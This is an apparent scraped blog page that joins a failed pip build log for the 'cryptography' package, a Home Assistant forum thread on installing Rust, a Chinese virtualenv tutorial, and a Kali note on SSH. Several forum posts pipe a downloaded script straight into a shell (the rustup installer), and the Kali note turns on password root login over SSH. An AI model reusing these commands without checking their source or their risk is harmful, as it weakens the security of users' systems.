class=\"line\">  copying src/cryptography/hazmat/primitives/poly1305.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/padding.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/cmac.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/hashes.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/hmac.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/keywrap.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/constant_time.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/_serialization.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/_asymmetric.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat/bindings</span><br><span class=\"line\">  copying src/cryptography/hazmat/bindings/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/bindings</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/aead.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/x25519.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/rsa.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/decode_asn1.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/ed448.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/poly1305.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/x448.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/cmac.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/ed25519.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/x509.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/dsa.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/hashes.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/hmac.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/ec.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/dh.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/ciphers.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/utils.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/backend.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/encode_asn1.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/serialization</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/serialization/pkcs12.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/serialization</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/serialization/base.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/serialization</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/serialization/pkcs7.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/serialization</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/serialization/ssh.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/serialization</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/serialization/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/serialization</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/x25519.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/rsa.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/ed448.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/x448.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/padding.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/ed25519.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/dsa.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/types.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/ec.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/dh.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/utils.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/twofactor</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/twofactor/totp.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/twofactor</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/twofactor/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/twofactor</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/twofactor/hotp.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/twofactor</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/ciphers</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/ciphers/aead.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/ciphers</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/ciphers/base.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/ciphers</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/ciphers/modes.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/ciphers</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/ciphers/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/ciphers</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/ciphers/algorithms.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/ciphers</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/kdf</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/kdf/pbkdf2.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/kdf</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/kdf/scrypt.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/kdf</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/kdf/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/kdf</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/kdf/x963kdf.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/kdf</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/kdf/kbkdf.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/kdf</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/kdf/concatkdf.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/kdf</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/kdf/hkdf.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/kdf</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat/bindings/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/bindings/openssl/binding.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/bindings/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/bindings/openssl/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/bindings/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/bindings/openssl/_conditional.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/bindings/openssl</span><br><span class=\"line\">  running egg_info</span><br><span class=\"line\">  writing src/cryptography.egg-info/PKG-INFO</span><br><span class=\"line\">  writing dependency_links to src/cryptography.egg-info/dependency_links.txt</span><br><span class=\"line\">  writing requirements to src/cryptography.egg-info/requires.txt</span><br><span class=\"line\">  writing top-level names to src/cryptography.egg-info/top_level.txt</span><br><span class=\"line\">  reading manifest file &#x27;src/cryptography.egg-info/SOURCES.txt&#x27;</span><br><span class=\"line\">  reading manifest template &#x27;MANIFEST.in&#x27;</span><br><span class=\"line\">  no previously-included directories found matching &#x27;docs/_build&#x27;</span><br><span class=\"line\">  warning: no previously-included files found matching &#x27;vectors&#x27;</span><br><span class=\"line\">  warning: no previously-included files matching &#x27;*&#x27; found under directory &#x27;vectors&#x27;</span><br><span class=\"line\">  warning: no previously-included files matching &#x27;*&#x27; found under directory &#x27;.github&#x27;</span><br><span class=\"line\">  warning: no previously-included files found matching &#x27;release.py&#x27;</span><br><span class=\"line\">  warning: no previously-included files found matching &#x27;.coveragerc&#x27;</span><br><span class=\"line\">  warning: no previously-included files found matching &#x27;codecov.yml&#x27;</span><br><span class=\"line\">  warning: no previously-included files found matching &#x27;.readthedocs.yml&#x27;</span><br><span class=\"line\">  warning: no previously-included files found matching &#x27;dev-requirements.txt&#x27;</span><br><span class=\"line\">  warning: no previously-included files found matching &#x27;tox.ini&#x27;</span><br><span class=\"line\">  warning: no previously-included files found matching &#x27;mypy.ini&#x27;</span><br><span class=\"line\">  warning: no previously-included files matching &#x27;*&#x27; found under directory &#x27;.zuul.d&#x27;</span><br><span class=\"line\">  warning: no previously-included files matching &#x27;*&#x27; found under directory &#x27;.zuul.playbooks&#x27;</span><br><span class=\"line\">  adding license file &#x27;LICENSE&#x27;</span><br><span class=\"line\">  adding license file &#x27;LICENSE.APACHE&#x27;</span><br><span class=\"line\">  adding license file &#x27;LICENSE.BSD&#x27;</span><br><span class=\"line\">  adding license file &#x27;LICENSE.PSF&#x27;</span><br><span class=\"line\">  writing manifest file &#x27;src/cryptography.egg-info/SOURCES.txt&#x27;</span><br><span class=\"line\">  copying src/cryptography/py.typed -&gt; build/lib.linux-armv7l-3.8/cryptography</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat/bindings/_rust</span><br><span class=\"line\">  copying src/cryptography/hazmat/bindings/_rust/__init__.pyi -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/bindings/_rust</span><br><span class=\"line\">  copying src/cryptography/hazmat/bindings/_rust/asn1.pyi -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/bindings/_rust</span><br><span class=\"line\">  copying src/cryptography/hazmat/bindings/_rust/ocsp.pyi -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/bindings/_rust</span><br><span class=\"line\">  copying src/cryptography/hazmat/bindings/_rust/x509.pyi -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/bindings/_rust</span><br><span class=\"line\">  running build_ext</span><br><span class=\"line\">  running build_rust</span><br><span class=\"line\">      Updating crates.io index</span><br><span class=\"line\"></span><br><span class=\"line\">      =============================DEBUG ASSISTANCE=============================</span><br><span class=\"line\">      If you are seeing a compilation error please try the following steps to</span><br><span class=\"line\">      successfully install cryptography:</span><br><span class=\"line\">      1) Upgrade to the latest pip and try again. This will fix errors for most</span><br><span class=\"line\">         users. See: https://pip.pypa.io/en/stable/installing/#upgrading-pip</span><br><span class=\"line\">      2) Read https://cryptography.io/en/latest/installation/ for specific</span><br><span class=\"line\">         instructions for your platform.</span><br><span class=\"line\">      3) Check our frequently asked questions for more information:</span><br><span class=\"line\">         https://cryptography.io/en/latest/faq/</span><br><span class=\"line\">      4) Ensure you have a recent Rust toolchain installed:</span><br><span class=\"line\">         https://cryptography.io/en/latest/installation/#rust</span><br><span class=\"line\"></span><br><span class=\"line\">      Python: 3.8.5</span><br><span class=\"line\">      platform: Linux-5.10.63-v7+-armv7l-with-glibc2.28</span><br><span class=\"line\">      pip: n/a</span><br><span class=\"line\">      setuptools: 59.6.0</span><br><span class=\"line\">      setuptools_rust: 1.1.2</span><br><span class=\"line\">      =============================DEBUG ASSISTANCE=========================</span><br><span class=\"line\"></span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">    File &quot;/srv/homeassistant/lib/python3.8/site-packages/pip/_vendor/pep517/in_process/_in_process.py&quot;, line 363, in &lt;module&gt;</span><br><span class=\"line\">      main()</span><br><span class=\"line\">    File &quot;/srv/homeassistant/lib/python3.8/site-packages/pip/_vendor/pep517/in_process/_in_process.py&quot;, line 345, in main</span><br><span class=\"line\">      json_out[&#x27;return_val&#x27;] = hook(**hook_input[&#x27;kwargs&#x27;])</span><br><span class=\"line\">    File &quot;/srv/homeassistant/lib/python3.8/site-packages/pip/_vendor/pep517/in_process/_in_process.py&quot;, line 261, in build_wheel</span><br><span class=\"line\">      return _build_backend().build_wheel(wheel_directory, config_settings,</span><br><span class=\"line\">    File &quot;/tmp/pip-build-env-wtu1ut7k/overlay/lib/python3.8/site-packages/setuptools/build_meta.py&quot;, line 230, in build_wheel</span><br><span class=\"line\">      return self._build_with_temp_dir([&#x27;bdist_wheel&#x27;], &#x27;.whl&#x27;,</span><br><span class=\"line\">    File &quot;/tmp/pip-build-env-wtu1ut7k/overlay/lib/python3.8/site-packages/setuptools/build_meta.py&quot;, line 215, in _build_with_temp_dir</span><br><span class=\"line\">      self.run_setup()</span><br><span class=\"line\">    File &quot;/tmp/pip-build-env-wtu1ut7k/overlay/lib/python3.8/site-packages/setuptools/build_meta.py&quot;, line 158, in run_setup</span><br><span class=\"line\">      exec(compile(code, __file__, &#x27;exec&#x27;), locals())</span><br><span class=\"line\">    File &quot;setup.py&quot;, line 39, in &lt;module&gt;</span><br><span class=\"line\">      setup(</span><br><span class=\"line\">    File &quot;/tmp/pip-build-env-wtu1ut7k/overlay/lib/python3.8/site-packages/setuptools/__init__.py&quot;, line 153, in setup</span><br><span class=\"line\">      return distutils.core.setup(**attrs)</span><br><span class=\"line\">    File &quot;/usr/local/lib/python3.8/distutils/core.py&quot;, line 148, in setup</span><br><span class=\"line\">      dist.run_commands()</span><br><span class=\"line\">    File &quot;/usr/local/lib/python3.8/distutils/dist.py&quot;, line 966, in run_commands</span><br><span class=\"line\">      self.run_command(cmd)</span><br><span class=\"line\">    File &quot;/usr/local/lib/python3.8/distutils/dist.py&quot;, line 985, in run_command</span><br><span class=\"line\">      cmd_obj.run()</span><br><span class=\"line\">    File &quot;/tmp/pip-build-env-wtu1ut7k/overlay/lib/python3.8/site-packages/wheel/bdist_wheel.py&quot;, line 299, in run</span><br><span class=\"line\">      self.run_command(&#x27;build&#x27;)</span><br><span class=\"line\">    File &quot;/usr/local/lib/python3.8/distutils/cmd.py&quot;, line 313, in run_command</span><br><span class=\"line\">      self.distribution.run_command(command)</span><br><span class=\"line\">    File &quot;/usr/local/lib/python3.8/distutils/dist.py&quot;, line 985, in run_command</span><br><span class=\"line\">      cmd_obj.run()</span><br><span class=\"line\">    File &quot;/usr/local/lib/python3.8/distutils/command/build.py&quot;, line 135, in run</span><br><span class=\"line\">      self.run_command(cmd_name)</span><br><span class=\"line\">    File &quot;/usr/local/lib/python3.8/distutils/cmd.py&quot;, line 313, in run_command</span><br><span class=\"line\">      self.distribution.run_command(command)</span><br><span class=\"line\">    File &quot;/usr/local/lib/python3.8/distutils/dist.py&quot;, line 985, in run_command</span><br><span class=\"line\">      cmd_obj.run()</span><br><span class=\"line\">    File &quot;/tmp/pip-build-env-wtu1ut7k/overlay/lib/python3.8/site-packages/setuptools_rust/setuptools_ext.py&quot;, line 132, in run</span><br><span class=\"line\">      build_rust.run()</span><br><span class=\"line\">    File &quot;/tmp/pip-build-env-wtu1ut7k/overlay/lib/python3.8/site-packages/setuptools_rust/command.py&quot;, line 101, in run</span><br><span class=\"line\">      self.run_for_extension(ext)</span><br><span class=\"line\">    File &quot;/tmp/pip-build-env-wtu1ut7k/overlay/lib/python3.8/site-packages/setuptools_rust/build.py&quot;, line 108, in run_for_extension</span><br><span class=\"line\">      dylib_paths = self.build_extension(ext, self.target)</span><br><span class=\"line\">    File &quot;/tmp/pip-build-env-wtu1ut7k/overlay/lib/python3.8/site-packages/setuptools_rust/build.py&quot;, line 139, in build_extension</span><br><span class=\"line\">      target_dir = _base_cargo_target_dir(ext)</span><br><span class=\"line\">    File &quot;/tmp/pip-build-env-wtu1ut7k/overlay/lib/python3.8/site-packages/setuptools_rust/build.py&quot;, line 673, in _base_cargo_target_dir</span><br><span class=\"line\">      target_directory = ext._metadata()[&quot;target_directory&quot;]</span><br><span class=\"line\">    File &quot;/tmp/pip-build-env-wtu1ut7k/overlay/lib/python3.8/site-packages/setuptools_rust/extension.py&quot;, line 200, in _metadata</span><br><span class=\"line\">      self._cargo_metadata = json.loads(subprocess.check_output(metadata_command))</span><br><span class=\"line\">    File &quot;/usr/local/lib/python3.8/subprocess.py&quot;, line 411, in check_output</span><br><span class=\"line\">      return run(*popenargs, stdout=PIPE, timeout=timeout, check=True,</span><br><span class=\"line\">    File &quot;/usr/local/lib/python3.8/subprocess.py&quot;, line 512, in run</span><br><span class=\"line\">      raise CalledProcessError(retcode, process.args,</span><br><span class=\"line\">  subprocess.CalledProcessError: Command &#x27;[&#x27;cargo&#x27;, &#x27;metadata&#x27;, &#x27;--manifest-path&#x27;, &#x27;src/rust/Cargo.toml&#x27;, &#x27;--format-version&#x27;, &#x27;1&#x27;]&#x27; died with &lt;Signals.SIGSEGV: 11&gt;.</span><br><span class=\"line\">  ----------------------------------------</span><br><span class=\"line\">  ERROR: Failed building wheel for cryptography</span><br><span class=\"line\">Failed to build cryptography</span><br><span class=\"line\">ERROR: Could not build wheels for cryptography, which is required to install pyproject.toml-based projects</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://community.home-assistant.io/u/koying\">koying</a> (Chris B)December 18, 2021, 9:38am#10</p>\n<p>The export trick doesn’t work anymore in 2021.12, due to “cryptography” being bumped to 3.5.<br>That did the trick for me, i.e. installing a newer rust/cargo from origin.</p>\n<p><img src=\"https://community.home-assistant.io/user_avatar/community.home-assistant.io/garlandkr/40/158085_2.png\" alt=\"img\"> <a href=\"https://community.home-assistant.io/t/cant-update-ha-to-the-latest-version/345605/5\">Can’t update HA to the latest version</a> <a href=\"https://community.home-assistant.io/c/installation/17\">Installation</a></p>\n<blockquote>\n<p>I also experienced this issue when trying to upgrade hass core, however when trying to install cargo I got an error of E: Package ‘cargo’ has no installation candidate to solve this I did the following: sudo apt remove rustc curl <a href=\"https://sh.rustup.rs/\">https://sh.rustup.rs</a> -sSf | sh This installed rust and cargo on my Rpi4 running RaspberryPi 10 (Buster). Just leaving this here for anyone else that encounters the issue on Raspian. Make sure to run the curl command as the user who is running home-assistant.</p>\n</blockquote>\n<p>1 Like</p>\n<p><a href=\"https://community.home-assistant.io/u/Rudhan\">Rudhan</a> (Tomas Rudh)December 18, 2021, 12:22pm#11</p>\n<p>Excellent, that worked. To clarify, these are the commands I ran:<br>sudo apt remove rustc<br>sudo curl <a href=\"https://sh.rustup.rs/\">https://sh.rustup.rs</a> -sSf | sh</p>\n<p>Thanks so much!</p>\n<p>1 Like</p>\n<p><a href=\"https://community.home-assistant.io/u/seventh\">seventh</a> (Dima)December 24, 2021, 6:12am#12</p>\n<p>Same problem even after upgrade rust. My <a href=\"https://pastebin.com/iFN2krNn\">log</a>.<br>rustc 1.57.0</p>\n<p><a href=\"https://community.home-assistant.io/u/Martor\">Martor</a> (Martin)December 29, 2021, 11:46pm#13</p>\n<p>Hi,</p>\n<p>for armv7 during the cargo and rustc installation</p>\n<blockquote>\n<p>curl <a href=\"https://sh.rustup.rs/\">https://sh.rustup.rs </a>-sSf | sh</p>\n</blockquote>\n<p>please first select option 2 and chage it to “armv7-unknown-linux-gnueabihf”, rest just enter defaults and then select option 1 and install. After that type:</p>\n<blockquote>\n<p>source $HOME/.cargo/env</p>\n</blockquote>\n<p>To double check if it is ok, just type</p>\n<blockquote>\n<p>rustc – version</p>\n</blockquote>\n<p>to see if it is OK.</p>\n<p>Then run again installation of HA and the Cryptography should be properly built.</p>\n<p>Good luck <img src=\"https://community.home-assistant.io/images/emoji/twitter/wink.png?v=10\" alt=\":wink:\"></p>\n<p>P.S. be sure to unistall previous version via:</p>\n<blockquote>\n<p>sudo apt remove rustc cargo</p>\n</blockquote>\n<p>If you need to unistall previous cargo and rustc, use:</p>\n<blockquote>\n<p>rustup self uninstall</p>\n</blockquote>\n<p>2 Likes</p>\n<p><a href=\"https://community.home-assistant.io/u/britiger\">britiger</a> (Christopher)December 30, 2021, 3:27pm#14</p>\n<p>Hi,</p>\n<p>I found a workaround on one the debian bug reports. I seams to be a second bug with rust and git. If I set the following variables I was able to install the required cryptography 35.0.0 package:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> CRYPTOGRAPHY_DONT_BUILD_RUST=1</span><br><span class=\"line\"><span class=\"built_in\">export</span> CARGO_NET_GIT_FETCH_WITH_CLI=<span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n\n<p>Christopher</p>\n<p><a href=\"https://community.home-assistant.io/u/Piotr_Kowalski\">Piotr_Kowalski</a> (Piotr Kowalski)December 30, 2021, 5:54pm#15</p>\n<p>Hi, should I update Rust in pip env or in my main account? I updated as a root user but in pip env HA says me: error: can’t find Rust compiler</p>\n<p>EDIT<br>Helped me adding<br><code>export PATH=$PATH:~/.cargo/bin</code><br>after instalation of Rush from<br><code>curl [https://sh.rustup.rs](https://sh.rustup.rs/) -sSf | sh</code></p>\n<p><a href=\"https://community.home-assistant.io/u/mike3\">mike3</a>January 3, 2022, 1:35am#16</p>\n<p>This did it for me! Running<br><code>rustup self uninstall</code><br>first was important.</p>\n<p>I’m on a raspberry pi. To make sure I was on an ARMv7 processor architecture I ran:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cat /proc/cpuinfo</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://community.home-assistant.io/\">Home</a> <a href=\"https://community.home-assistant.io/categories\">Categories</a> <a href=\"https://community.home-assistant.io/guidelines\">FAQ/Guidelines</a> <a href=\"https://community.home-assistant.io/tos\">Terms of Service</a> <a href=\"https://community.home-assistant.io/privacy\">Privacy Policy</a></p>\n<h2 id=\"linux在python的虚拟环境下运行程序-安装python虚拟运行环境，linux下轻松切换python2和python3…\"><a href=\"#linux在python的虚拟环境下运行程序-安装python虚拟运行环境，linux下轻松切换python2和python3…\" class=\"headerlink\" title=\"linux在python的虚拟环境下运行程序_安装python虚拟运行环境，linux下轻松切换python2和python3…\"></a>linux在python的虚拟环境下运行程序_安装python虚拟运行环境，linux下轻松切换python2和python3…</h2><p><a href=\"https://blog.csdn.net/weixin_39959615\">weixin_39959615</a><img src=\"https://csdnimg.cn/release/blogv2/dist/pc/img/newCurrentTime2.png\" alt=\"img\">于 2020-11-20 18:10:42 发布<img src=\"https://csdnimg.cn/release/blogv2/dist/pc/img/articleReadEyes2.png\" alt=\"img\">78</p>\n<p>文章标签： <a href=\"https://so.csdn.net/so/search/s.do?q=linux%E5%9C%A8python%E7%9A%84%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E4%B8%8B%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F&t=blog&o=vip&s=&l=&f=&viparticle=\">linux在python的虚拟环境下运行程序</a></p>\n<p>一、查询系统采用的python版本</p>\n<p>$ python –version</p>\n<p>Python 3.7.3</p>\n<p>系统采用的python版本为3.7.3</p>\n<p>以下查询py3和py2的目录：</p>\n<p>$ which python3.7</p>\n<p>/usr/bin/python3.7</p>\n<p>$ which python2.7</p>\n<p>/usr/bin/python2.7</p>\n<p>二、安装python虚拟运行环境</p>\n<p>pip安装</p>\n<p>$ sudo pip install virtualenvwrapper</p>\n<p>上述工具装好后，需要执行以下环境变量设置。</p>\n<p>1.创建目录用来存放<a href=\"https://so.csdn.net/so/search?q=%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83&spm=1001.2101.3001.7020\">虚拟环境</a></p>\n<p>mkdir $HOME/.virtualenvs</p>\n<p>2.在~/.bashrc中添加行：</p>\n<p>export WORKON_HOME=$HOME/.virtualenvs</p>\n<p>source /usr/bin/virtualenvwrapper.sh</p>\n<p>3.运行:</p>\n<p>source ~/.bashrc</p>\n<p>三、创建python虚拟环境</p>\n<p>当你需要使用Python2开发项目时，建立一个Python2的虚拟环境：</p>\n<p>$ mkvirtualenv -p /usr/bin/python2.7 env27</p>\n<p>当你需要Python3开发时：</p>\n<p>$ mkvirtualenv -p /usr/bin/python3.7 env37</p>\n<p>然后可以随时切换不同的虚拟环境：</p>\n<p>$ workon env27 # 进入Python2环境</p>\n<p>$ workon env37 # 进入Python3环境</p>\n<p>不仅可以自由切换py2和py3，同一个版本下还可以配置不同的依赖，pip不同的包，来适应不同项目的需求。</p>\n<p>更爽的是，你可以在进入虚拟环境的同时切换到项目目录，只需要编辑 $VIRTUAL_ENV/bin/postactivate 这个文件即可：</p>\n<p>$ vim $VIRTUAL_ENV/bin/postactivate #前提是已经进入对应的虚拟环境</p>\n<p>在文件中添加切换目录的命令：</p>\n<p>cd /path/to/your/project</p>\n<p>四、退出虚拟环境 离开 deactivate</p>\n<h1 id=\"kali-linux-开启SSH服务-容许root登陆\"><a href=\"#kali-linux-开启SSH服务-容许root登陆\" class=\"headerlink\" title=\"kali linux 开启SSH服务 容许root登陆\"></a>kali linux 开启SSH服务 容许root登陆</h1><ol>\n<li>查看ssh服务状态</li>\n</ol>\n<p>/etc/init.d/ssh status</p>\n<p>2.修改配置文件</p>\n<p>vim /etc/ssh/sshd_config</p>\n<p>#PermitRootLogin prohibit-password<br>PermitRootLogin yes<br>#PasswordAuthentication yes<br>PasswordAuthentication yes</p>\n<ol start=\"3\">\n<li>启动ssh服务</li>\n</ol>\n<p>/etc/init.d/ssh start</p>\n<p>查看服务状态</p>\n<p>/etc/init.d/ssh status</p>\n<p>开机启动</p>\n<p>update-rc.d ssh enable<br>参考：1.Kali Linux 2.0开启SSH服务 使用SSH进行远程访问</p>\n<h1 id=\"kali-rpm-安装方法-Kali-Linux安装过程记录\"><a href=\"#kali-rpm-安装方法-Kali-Linux安装过程记录\" class=\"headerlink\" title=\"kali rpm 安装方法_Kali Linux安装过程记录\"></a>kali rpm 安装方法_Kali Linux安装过程记录</h1><p>Kali Linux是一款基于Debian Linux开发的用于用户渗透测试和安全审计的操作系统。</p>\n<p>一、在Linux 